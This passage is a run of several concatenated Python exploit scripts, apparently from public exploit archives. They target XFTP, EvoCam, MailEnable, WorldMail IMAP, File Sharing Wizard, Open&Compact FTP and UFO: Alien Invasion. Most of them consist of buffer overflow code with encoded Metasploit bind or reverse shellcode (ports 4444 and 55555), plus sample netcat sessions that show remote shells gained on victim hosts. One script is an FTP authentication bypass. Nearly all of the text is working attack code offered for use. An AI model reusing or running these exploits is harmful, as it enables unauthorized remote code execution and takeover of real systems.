"\x41"*224+
"\xa9\x31\xe3\x74"	#0x74E331A9 JMP ESP RICHED20.dll
"\x90\x90\x90\x90"
"\xa9\x31\xe3\x74"+	#0x74E331A9 JMP ESP RICHED20.dll
"\x90"*12+		#Alignment
getpc+
messagebox+		#MessageboxA shellcode
"\x90"*100              #NOPs
);

## Main FTP server
## If the 1st LIST transfer fails, try again.
def ftp():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 21))
	print "[*] Port 21 up. ph33r!"
	s.listen(10)
	rport = 0
	addr  = ""
	while 1:
		c, addr = s.accept()
		c.send("200 Hola Mundo!\r\n")
		print "[*] %s connected" %addr[0]
		while 1:
			data = c.recv(1024)
			if "USER" in data:
				c.send("331 OK\r\n")
				print "[*] 331 USER = %s" %data.split(" ")[1],
			elif "PASS" in data:
				c.send("230 OK\r\n")
				print "[*] 230 PASS = %s" %data.split(" ")[1],
			elif "PORT" in data:
				tmp = data.split(" ")[1].split(",")
				rport = int(tmp[4])*256+int(tmp[5])
				c.send("200 OK\r\n")
				print "[*] 200 PORT set to %s" %rport
			elif "TYPE" in data:
				c.send("200 OK\r\n")
				print "[*] 200 TYPE"
			elif "PWD" in data:
				c.send("257 \"/\" is current directory\r\n")
				print "[*] 257 PWD"
			elif "CWD" in data:
				c.send("257 \"/\" is current directory\r\n")
				print "[*] 257 CWD"
			elif "SYST" in data:
				c.send("215 UNIX Type: L8\r\n")
				print "[*] SYST 215"
			elif "LIST" in data:
				dir = "-rw-rw-r--    1 1176     1176         1060 Apr 23 23:17  %s.bin\r\n\r\n"
				c.send("150 OK.\r\n226 Directory ok\r\n")
				_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				_s.connect((addr[0], rport))
				_s.send(dir %evil)
				_s.close()
				print "[*] LIST sent. Check messagebox."
				c.close()
				break
			else:
				try:
					c.send("500 Meh...\r\n")
				except:
					c.close()
					break

def main():
	try:
		ftp()
	except KeyboardInterrupt:
		print "\r\n[*] Adios!"
		sys.exit(0)

if __name__ == "__main__":
	print "|------------------------------------------------------"
	print "|  XFTP 3.0 Build 0239 Long filename Buffer Overflow  |"
	print "|  coded by sinn3r               twitter.com/_sinn3r  |"
	print "|-----------------------------------------------------|"
	main()
#!/usr/bin/python

# Exploit Title: OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Date: 1st June 2010
# Author: d1dn0t ( didnot __A-T__ me.com )
# Software Link: http://www.pizza.org/evocam.dmg
# Version: EvoCam 3.6.6 and 3.6.7
# Tested on: OS X 10.5.8 Intel

import socket
import sys
import struct
from optparse import OptionParser

# OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Tested on Leopard 10.5.8 Intel
# Paul Harrington didnot __A-T__ me.com
#
#$ ./evocam.py -H 192.168.1.28 -P 8080 -T 2
#EvoLogical EvoCam 3.6.6/7 on OS X 10.5.8 Intel HTTP Buffer Overflow Exploit
#didnot __A-T__ me.com
#Targeting EvoCam Version 3.6.7
#[+] Sending evil buffer...
#[+] Done!
#[*] Check your shell at 192.168.1.28:4444
#$ nc -v 192.168.1.28 4444
#Connection to 192.168.1.28 4444 port [tcp/krb524] succeeded!
#uname -a
#Darwin Leopard-VM.local 9.8.0 Darwin Kernel Version 9.8.0: Wed Jul 15 16:55:01 PDT 2009; root:xnu-1228.15.4~1/RELEASE_I386 i386

print "EvoLogical EvoCam 3.6.6/7 on OS X 10.5.8 Intel HTTP Buffer Overflow Exploit"
print "didnot __A-T__ me.com"

usage = "%prog -H TARGET_HOST -P TARGET_PORT -T Target "
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string", action="store",
dest="HOST", help="Destination Host")
parser.add_option("-P", "--target_port", type="int", action="store",
dest="PORT", help="Destination Port")
parser.add_option("-T", "--target", type="string", action="store",
dest="TARGET", help="Target Version [1=3.6.6 2=3.6.7]")
(options, args) = parser.parse_args()
HOST = options.HOST
PORT = options.PORT

if options.TARGET == "1" :
     print "Targeting EvoCam Version 3.6.6"
     BUFLEN=1560
elif options.TARGET == "2" :
     print "Targeting EvoCam Version 3.6.7"
     BUFLEN=1308
else:
     BUFLEN=0

if not (HOST and PORT and BUFLEN):
     parser.print_help()
     sys.exit()

# Settings for Leopard 10.5.8
WRITEABLE = 0x8fe66448
SETJMP = 0x8fe1cf38 #$ nm /usr/lib/dyld | grep "setjmp" #8fe1cf38 t _setjmp
STRDUP = 0x8fe210dc #$ nm /usr/lib/dyld | grep "strdup" #8fe210dc t _strdup
JMPEAX = 0x8fe01041 #0x8fe01041 <__dyld__dyld_start+49>: jmp *%eax

NOP="\x90\x90"

buf = \
"\xdb\xd2\x29\xc9\xb1\x27\xbf\xb1\xd5\xb6\xd3\xd9\x74\x24" + \
"\xf4\x5a\x83\xea\xfc\x31\x7a\x14\x03\x7a\xa5\x37\x43\xe2" + \
"\x05\x2e\xfc\x45\xd5\x11\xad\x17\x65\xf0\x80\x18\x8a\x71" + \
"\x64\x19\x94\x75\x10\xdf\xc6\x27\x70\x88\xe6\xc5\x65\x14" + \
"\x6f\x2a\xef\xb4\x3c\xfb\xa2\x04\xaa\xce\xc3\x17\x4d\x83" + \
"\x95\x85\x21\x49\xd7\xaa\x33\xd0\xb5\xf8\xe5\xbe\x89\xe3" + \
"\xc4\xbf\x98\x4f\x5f\x78\x6d\xab\xdc\x6c\x8f\x08\xb1\x25" + \
"\xc3\x3e\x6f\x07\x63\x4c\xcc\x14\x9f\xb2\xa7\xeb\x51\x75" + \
"\x17\x5c\xc2\x25\x27\x67\x2f\x45\xd7\x08\x93\x6b\xa2\x21" + \
"\x5c\x31\x81\xb2\x1f\x4c\x19\xc7\x08\x80\xd9\x77\x5f\xcd" + \
"\xf6\x04\xf7\x79\x27\x89\x6e\x14\xbe\xae\x21\xb8\x93\x60" + \
"\x72\x03\xde\x01\x43\xb4\xb0\x88\x47\x64\x60\xd8\xd7\xd5" + \
"\x30\xd9\x1a\x55\x01\x26\xf4\x06\x21\x6b\x75\xac"

FRAG0 = "\x90" + "\x58" + "\x61" + "\xc3"
FRAG1 = "\x90" + "\x58" + "\x89\xe0" + "\x83\xc0\x0e" + "\x89\x44\x24\x08"
+ "\xc3" # 0C is a bad character

STUB = \
FRAG0 + \
struct.pack('<III',SETJMP,WRITEABLE+32,WRITEABLE) + \
FRAG1 + \
'A'*20 +\
struct.pack('<IIIII',SETJMP,WRITEABLE+24,WRITEABLE,STRDUP,JMPEAX) + \
'A'*4

BUFFER = "A"*BUFLEN + STUB + NOP + buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((HOST,PORT))
print '[+] Sending evil buffer...'
s.send("GET " +BUFFER + " HTTP/1.0\r\n\r\n")
print "[+] Done!"
print "[*] Check your shell at %s:4444 " % HOST
s.close()#!/usr/bin/python
############################################################
#
# Remote Mailenable Enterprise 1.1 EXAMINE buffer Overflow
# Discovered and exploited by mati@see-security.com
# This vulnerability affects Mailenable Enterprise 1.1
# *without* the ME-10009.EXE patch.
#
# Details:
# * SEH gets overwritten at 965 (968 in VMWare) bytes in the EXAMINE command.
# * Filtering of 0x00 0x0a 0x0d 0x20 0x22
# * No space for shellcode, so 1st stage shellcode is used to
#   jump back 512 bytes into the bindshell (2nd stage) shellcode.
#
# Thanks:
# * My wife - for putting up with my obesssions
# * Talz - for helping me out with the 1st stage shellcode
#
#		 FOR EDUCATION PURPOSES ONLY!
############################################################
# 1st stage shellcode:
############################################################
# [BITS 32]
# 
# global _start
#
# _start:
# 
# ;--- Taken from phrack #62 Article 7 Originally written by Aaron Adams
# 
# ;--- copy eip into ecx 
# fldz
# fnstenv [esp-12]
# pop ecx
# add cl, 10
# nop
# ;----------------------------------------------------------------------
# dec ch      ; ecx=-256;
# dec ch      ; ecx=-256;
# jmp ecx     ; lets jmp ecx (current location - 512)
############################################################
# root@muts:/tmp# ./final.py 192.168.1.160 143 ftp ftp
#
# MailEnable Enterprise 1.1 IMAP EXAMINE Overflow - Pre ME-10009.EXE Patch.
# Discovered / Coded by mati@see-security.com
#
# [+] Connecting to 192.168.1.160
# [+] * OK IMAP4rev1 server ready at 12/19/05 15:29:06
# [+] Logging in as ftp
# [+] a001 OK LOGIN completed
# [+] Sending evil buffer...
# [+] Done
#
# [+] Try connecting to port 4444 on victim IP - Muhahaha!
#
# root@slax:/tmp# nc -nv 192.168.1.160 4444
# (UNKNOWN) [192.168.1.160] 4444 (krb524) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\WINNT\system32>
#####################################################

import sys
import struct
import socket
from time import sleep

if len(sys.argv)!=5:
	print "\nMailEnable Enterprise 1.1 IMAP EXAMINE Overflow - Pre ME-10009 Patch."
        print "\nDiscovered / Coded by mati@see-security.com\n"
        print "Usage: %s <ip> <port> <user> <pass>\n" %sys.argv[0]
        sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Return Address - Win2k SP4 jmp ebx
returnaddress = "\x66\x4a\x4e\x7c"

# Using Msf::Encoder::PexFnstenvMov with final size of 42 bytes
# First Stage Shellcode

sc = "\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x16\x91\x9c"
sc +="\x30\x83\xeb\xfc\xe2\xf4\xcf\x7f\x45\x44\x32\x65\xc5\xb0\xd7\x9b"
sc +="\x0c\xce\xdb\x6f\x51\xcf\xf7\x91\x9c\x30"

# win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
# Second Stage Shellcode

sc2 = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfa"
sc2 +="\xa8\xc8\x2a\x83\xeb\xfc\xe2\xf4\x06\xc2\x23\x67\x12\x51\x37\xd5"
sc2 +="\x05\xc8\x43\x46\xde\x8c\x43\x6f\xc6\x23\xb4\x2f\x82\xa9\x27\xa1"
sc2 +="\xb5\xb0\x43\x75\xda\xa9\x23\x63\x71\x9c\x43\x2b\x14\x99\x08\xb3"
sc2 +="\x56\x2c\x08\x5e\xfd\x69\x02\x27\xfb\x6a\x23\xde\xc1\xfc\xec\x02"
sc2 +="\x8f\x4d\x43\x75\xde\xa9\x23\x4c\x71\xa4\x83\xa1\xa5\xb4\xc9\xc1"
sc2 +="\xf9\x84\x43\xa3\x96\x8c\xd4\x4b\x39\x99\x13\x4e\x71\xeb\xf8\xa1"
sc2 +="\xba\xa4\x43\x5a\xe6\x05\x43\x6a\xf2\xf6\xa0\xa4\xb4\xa6\x24\x7a"
sc2 +="\x05\x7e\xae\x79\x9c\xc0\xfb\x18\x92\xdf\xbb\x18\xa5\xfc\x37\xfa"
sc2 +="\x92\x63\x25\xd6\xc1\xf8\x37\xfc\xa5\x21\x2d\x4c\x7b\x45\xc0\x28"
sc2 +="\xaf\xc2\xca\xd5\x2a\xc0\x11\x23\x0f\x05\x9f\xd5\x2c\xfb\x9b\x79"
sc2 +="\xa9\xfb\x8b\x79\xb9\xfb\x37\xfa\x9c\xc0\xd9\x76\x9c\xfb\x41\xcb"
sc2 +="\x6f\xc0\x6c\x30\x8a\x6f\x9f\xd5\x2c\xc2\xd8\x7b\xaf\x57\x18\x42"
sc2 +="\x5e\x05\xe6\xc3\xad\x57\x1e\x79\xaf\x57\x18\x42\x1f\xe1\x4e\x63"
sc2 +="\xad\x57\x1e\x7a\xae\xfc\x9d\xd5\x2a\x3b\xa0\xcd\x83\x6e\xb1\x7d"
sc2 +="\x05\x7e\x9d\xd5\x2a\xce\xa2\x4e\x9c\xc0\xab\x47\x73\x4d\xa2\x7a"
sc2 +="\xa3\x81\x04\xa3\x1d\xc2\x8c\xa3\x18\x99\x08\xd9\x50\x56\x8a\x07"
sc2 +="\x04\xea\xe4\xb9\x77\xd2\xf0\x81\x51\x03\xa0\x58\x04\x1b\xde\xd5"
sc2 +="\x8f\xec\x37\xfc\xa1\xff\x9a\x7b\xab\xf9\xa2\x2b\xab\xf9\x9d\x7b"
sc2 +="\x05\x78\xa0\x87\x23\xad\x06\x79\x05\x7e\xa2\xd5\x05\x9f\x37\xfa"
sc2 +="\x71\xff\x34\xa9\x3e\xcc\x37\xfc\xa8\x57\x18\x42\x15\x66\x28\x4a"
sc2 +="\xa9\x57\x1e\xd5\x2a\xa8\xc8\x2a"

buffer = '\x90'*568 + sc2 + '\x90'*53 + returnaddress + '\xEB\x04' + '\x90'*4 + sc

print "\nMailEnable Enterprise 1.1 IMAP EXAMINE Overflow - Pre ME-10009.EXE Patch."
print "Discovered / Coded by mati@see-security.com\n"
print "[+] Connecting to " + sys.argv[1]
try:
	s.connect((sys.argv[1],int(sys.argv[2])))
except:
        print "Could not connect to IMAP server!"
        sys.exit(0)

data=s.recv(1024)
print "[+] "+data.rstrip()
print "[+] Logging in as %s" % sys.argv[3]
s.send('a001 LOGIN '+sys.argv[3]+' '+sys.argv[4]+'\r\n')
data = s.recv(1024)
print "[+] "+data.rstrip()
print "[+] Sending evil buffer..."
s.send('A001 EXAMINE ' + buffer+'\r\n')
s.close()
print "[+] Done\n"
print "[+] Try connecting to port 4444 on victim IP - Muhahaha!\n"

# milw0rm.com [2005-12-19]
#!/usr/bin/python
###################################################################################
#
# PRE AUTHENTICATION Eudora Qualcomm WorldMail 3.0 IMAPd Service 6.1.19.0 Overflow.
#
# Discovered by  Tim Shelton - security-advisories@acs-inc.com
#
# Coded by mati@see-security.com
#
# Details:
# * SEH gets overwritten at 970 bytes in the LIST command.
# * No space for shellcode, so 1st stage shellcode is used to
#   jump back 768 bytes into the bindshell (2nd stage) shellcode.
#
# Thanks:
# * My wife - for putting up with my obesssions
#                FOR EDUCATION PURPOSES ONLY!
###################################################################################
# root@muts:/tmp# ./test.py 192.168.1.162
#
# Eudora Qualcomm WorldMail 3.0 IMAPd Service 6.1.19.0 Overflow.
#
# Discovered by  Tim Shelton - security-advisories@acs-inc.com
# Coded by mati@see-security.com
#
# [+] Connecting
# [+] * OK  WorldMail IMAP4 Server 6.1.19.0 ready
# [+] Look Maa - No authentication!
# [+] Sending evil buffer...
# [+] Done
#
# [+] Connect to port 4444 on victim IP - Muhahaha!
#
# root@muts:/tmp# nc -vn 192.168.1.162 4444
# (UNKNOWN) [192.168.1.162] 4444 (krb524) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\WINNT\system32>
#############################################################################

import sys
import struct
import socket
from time import sleep

def banner():
        print "\nEudora Qualcomm WorldMail 3.0 IMAPd Service 6.1.19.0Overflow.\n"
        print "Discovered by  Tim Shelton - security-advisories@acs-inc.com"
        print "Coded by mati@see-security.com\n"
 
if len(sys.argv)!=3:
        banner()
        print "Usage: eudora-imap-LIST.py <ip> <port>\n"
        sys.exit(0)
        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Using Msf::Encoder::PexFnstenvMov with final size of 42 bytes
# First Stage Shellcode
sc3  ="\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x2f\x77\x28"
sc3 +="\x4b\x83\xeb\xfc\xe2\xf4\xf6\x99\xf1\x3f\x0b\x83\x71\xcb\xee\x7d"
sc3 +="\xb8\xb5\xe2\x89\xe5\xb5\xe2\x88\xc9\x4b"

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com */
# Second Stage Shellcode
sc4  ="\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
sc4 +="\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
sc4 +="\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
sc4 +="\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
sc4 +="\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
sc4 +="\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x38"
sc4 +="\x4e\x36\x46\x32\x46\x52\x4b\x58\x45\x54\x4e\x53\x4b\x38\x4e\x37"
sc4 +="\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x48"
sc4 +="\x4f\x35\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x58"
sc4 +="\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c"
sc4 +="\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
sc4 +="\x46\x4f\x4b\x33\x46\x35\x46\x52\x4a\x32\x45\x37\x45\x4e\x4b\x48"
sc4 +="\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x38\x4e\x50\x4b\x34"
sc4 +="\x4b\x38\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x38"
sc4 +="\x49\x48\x4e\x36\x46\x32\x4e\x41\x41\x36\x43\x4c\x41\x53\x4b\x4d"
sc4 +="\x46\x56\x4b\x58\x43\x54\x42\x53\x4b\x48\x42\x34\x4e\x50\x4b\x58"
sc4 +="\x42\x37\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x46"
sc4 +="\x50\x38\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x56"
sc4 +="\x43\x55\x48\x56\x4a\x46\x43\x53\x44\x53\x4a\x56\x47\x37\x43\x57"
sc4 +="\x44\x43\x4f\x45\x46\x45\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
sc4 +="\x4e\x4f\x4b\x43\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x38\x45\x4e"
sc4 +="\x48\x36\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x55\x4c\x36\x44\x30"
sc4 +="\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
sc4 +="\x4f\x4f\x48\x4d\x43\x55\x43\x45\x43\x45\x43\x45\x43\x45\x43\x44"
sc4 +="\x43\x45\x43\x44\x43\x55\x4f\x4f\x42\x4d\x48\x36\x4a\x56\x41\x31"
sc4 +="\x4e\x55\x48\x46\x43\x45\x49\x48\x41\x4e\x45\x49\x4a\x46\x46\x4a"
sc4 +="\x4c\x51\x42\x57\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x36\x42\x31"
sc4 +="\x41\x35\x45\x45\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
sc4 +="\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x45\x45\x35\x4f\x4f\x42\x4d"
sc4 +="\x4a\x36\x45\x4e\x49\x54\x48\x48\x49\x54\x47\x55\x4f\x4f\x48\x4d"
sc4 +="\x42\x35\x46\x45\x46\x55\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
sc4 +="\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x35\x4f\x4f\x48\x4d\x45\x55"
sc4 +="\x4f\x4f\x42\x4d\x48\x36\x4c\x56\x46\x36\x48\x46\x4a\x36\x43\x56"
sc4 +="\x4d\x56\x49\x58\x45\x4e\x4c\x56\x42\x45\x49\x35\x49\x32\x4e\x4c"
sc4 +="\x49\x38\x47\x4e\x4c\x36\x46\x54\x49\x38\x44\x4e\x41\x33\x42\x4c"
sc4 +="\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x52\x50\x4f\x44\x34\x4e\x32"
sc4 +="\x43\x59\x4d\x58\x4c\x57\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
sc4 +="\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x57\x46\x44\x4f\x4f"
sc4 +="\x48\x4d\x4b\x55\x47\x55\x44\x55\x41\x55\x41\x45\x41\x35\x4c\x46"
sc4 +="\x41\x30\x41\x35\x41\x45\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
sc4 +="\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
sc4 +="\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
sc4 +="\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
sc4 +="\x4a\x46\x42\x4f\x4c\x58\x46\x30\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
sc4 +="\x4f\x4f\x42\x4d\x5a"

# Win2k SP4 JMP EBX - 0x77E1CCF7

buffer = '\x90'*61 + sc4+ "\xeb\x06\x06\xeb" + '\xf7\xcc\xe1\x77' + '\x90'*8 + sc3 + '}'*400
banner()
try:
	s.connect((sys.argv[1],int(sys.argv[2])))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)
print "[+] Connecting"
data=s.recv(1024)
print "[+] "+data.rstrip()
print "[+] Look Maa - No authentication!"
print "[+] Sending evil buffer..."
s.send('a001 LIST '+buffer+'\r\n')
s.close()
print "[+] Done\n"
print "[+] Connect to port 4444 on victim IP - Muhahaha!\n"

# milw0rm.com [2005-12-20]
#!/usr/bin/python


print "\n##########################################################"
print "##		Team Hackers Garage			##"
print "##		(www.garage4hackers.com)		##"
print "##							##"
print "##	File Sharing Wizard Version 1.5.0		##"
print "##		Remote Command Execution		##"
print "##       	 	Author: b0nd			##"
print "##		(sumit.iips@gmail.com)			##"
print "##                           				##"
print "##	Greetz to: The Hackers Garage Family		##"
print "##	Thanks to: www.exploit-db.com/author/m1k3/	##"
print "##							##"
print "##			&				##"
print "##							##"
print "##		corelanc0d3r (CORELAN TEAM)		##"
print "##							##"
print "###########################################################"


# http://www.sharing-file.net/
# File Sharing Wizard Version 1.5.0 build on 26-8-2008

# Summary: The "HEAD" command leads to SEH overwrite and ultimately remote system compromise
# Tested on: Windows XP SP2
# SEH Overwrite and shellcode pointed out by EBP
# Huge space for shellcode.


import socket
import sys

if len(sys.argv) < 2:
	print "Usage: exploit-code.py <Remote-IP-Address> <Remote-Port>"
	sys.exit(1)

ips = sys.argv[1]
port = int(sys.argv[2])


string = "A"*1040
string += "\x90\x90\x1d\xeb"	# nSEH --> Jump to Shellcode
string += "\x29\xE3\xD3\x74"	# pop pop ret from oledlg.dll (SafeSEH OFF)
string += "\x90"*16		# Nop's

#win32_reverse -  EXITFUNC=seh LHOST=192.168.96.1 LPORT=55555 Size=649 Encoder=PexAlphaNum http://metasploit.com */
#Thumb rule - Don't trust the shellcode ;)
string += ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49" +
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36" +
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34" +
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41" +
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e" +
"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x38" +
"\x4e\x56\x46\x42\x46\x32\x4b\x48\x45\x44\x4e\x43\x4b\x38\x4e\x47" +
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x44\x4a\x31\x4b\x48" +
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x53\x4b\x38" +
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c" +
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e" +
"\x46\x4f\x4b\x53\x46\x45\x46\x42\x4a\x32\x45\x47\x45\x4e\x4b\x38" +
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x34" +
"\x4b\x58\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x48" +
"\x49\x48\x4e\x56\x46\x42\x4e\x31\x41\x36\x43\x4c\x41\x53\x4b\x4d" +
"\x46\x46\x4b\x58\x43\x54\x42\x53\x4b\x48\x42\x54\x4e\x50\x4b\x48" +
"\x42\x47\x4e\x41\x4d\x4a\x4b\x38\x42\x54\x4a\x30\x50\x55\x4a\x36" +
"\x50\x58\x50\x54\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36" +
"\x43\x45\x48\x36\x4a\x36\x43\x43\x44\x53\x4a\x36\x47\x57\x43\x57" +
"\x44\x53\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e" +
"\x4e\x4f\x4b\x43\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x58\x45\x4e" +
"\x48\x56\x41\x38\x4d\x4e\x4a\x30\x44\x30\x45\x55\x4c\x36\x44\x50" +
"\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55" +
"\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x55\x43\x55\x43\x44\x43\x55" +
"\x43\x44\x43\x45\x4f\x4f\x42\x4d\x4a\x56\x42\x4c\x4a\x4a\x42\x56" +
"\x41\x50\x48\x56\x4a\x36\x49\x4d\x43\x50\x48\x36\x43\x45\x49\x38" +
"\x41\x4e\x45\x59\x4a\x46\x4e\x4e\x49\x4f\x4c\x4a\x42\x56\x47\x35" +
"\x4f\x4f\x48\x4d\x4c\x56\x42\x41\x41\x55\x45\x35\x4f\x4f\x42\x4d" +
"\x48\x56\x4c\x46\x46\x36\x48\x36\x4a\x46\x43\x36\x4d\x56\x4c\x46" +
"\x42\x55\x49\x35\x49\x52\x4e\x4c\x49\x58\x47\x4e\x4c\x36\x46\x54" +
"\x49\x58\x44\x4e\x41\x33\x42\x4c\x43\x4f\x4c\x4a\x45\x39\x49\x48" +
"\x4d\x4f\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x44\x4e\x52\x4d\x48" +
"\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36\x44\x57\x50\x4f" +
"\x43\x4b\x48\x41\x4f\x4f\x45\x57\x4a\x42\x4f\x4f\x48\x4d\x4b\x55" +
"\x47\x45\x44\x35\x41\x55\x41\x55\x41\x35\x4c\x46\x41\x30\x41\x45" +
"\x41\x35\x45\x35\x41\x55\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d" +
"\x45\x50\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f" +
"\x47\x53\x4f\x4f\x42\x4d\x4a\x56\x47\x4e\x49\x57\x48\x4c\x49\x47" +
"\x4f\x4f\x45\x57\x46\x50\x4f\x4f\x48\x4d\x4f\x4f\x47\x47\x4e\x4f" +
"\x4f\x4f\x42\x4d\x4a\x56\x42\x4f\x4c\x48\x46\x30\x4f\x35\x43\x45" +
"\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a");

string += "D"*4000 # Some more junk

print "Launching remote BoF on", ips
print ""

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
	connect=s.connect((ips, port))
except:
	print "no connection possible"
	sys.exit(1)

print "\r\nsending payload"
print "..."

payload = (
'HEAD %s HTTP/1.0\r\n'
'\r\n') % (string)


s.send(payload)
s.close()

print "Check your netcat listening on TCP port 55555 for reverse connect shell\n"
print "%s pwned!" % (ips)

# Exploit Title: Open&Compact Ftp Server <= 1.2 Full System Access
# Date: June 12, 2010
# Author: Serge Gorbunov
# Software Link: http://sourceforge.net/projects/open-ftpd/
# Version: <= 1.2
# Tested on: Windows 7, Windows XP SP3
#!/usr/bin/python

# Simply by omitting login process to the open ftp server it is possible
# to execute any command, including but not limited to: listing files,
# retrieving files, storing files. 
# Below is an example of a few commands. 
# If you want to test storing files with no authentication, create a 
# test file and uncomment out line with ftp.storbinary function call.

# Any command will work as long as there is at least on user who has the permission
# to execute that command. For example, storing files will work as long
# as there is one user with write permission. No matter whom it is. 

import ftplib
import os

# Connect to server
ftp = ftplib.FTP( "127.0.0.1" )
ftp.set_pasv( False ) 

# Note that we need no authentication at all!! 

print ftp.retrlines( 'LIST' )
print ftp.retrbinary('RETR changelog.txt', open('changelog.txt', 'wb').write ) 

# filename = 'test.txt'
# f = open( filename, 'rb' ) 
# print ftp.storbinary( 'STOR ' + filename, f )
# f.close()

ftp.quit()
#!/usr/bin/python
#
# UFO: Alien Invasion v2.2.1 IRC Client Remote Code Execution - MacOSX
# Author: dookie
# Windows PoC: Jason Geffner http://www.exploit-db.com/exploits/14013
#
import sys, socket, struct

# msfpayload osx/x86/vforkshell_bind_tcp R | msfencode -b '\x00\x0a\x0d' -t c

shellcode = "\x90" * 16
shellcode += ("\xdb\xc3\xd9\x74\x24\xf4\xbb\xf3\xbd\x8d\x7c\x33\xc9\x5d\xb1"
"\x27\x31\x5d\x18\x03\x5d\x18\x83\xc5\xf7\x5f\x78\x4d\x37\x06"
"\xd3\xee\xe7\x79\x84\xbc\xb7\x1b\xe9\xc1\xb8\x59\x8f\xc1\xc6"
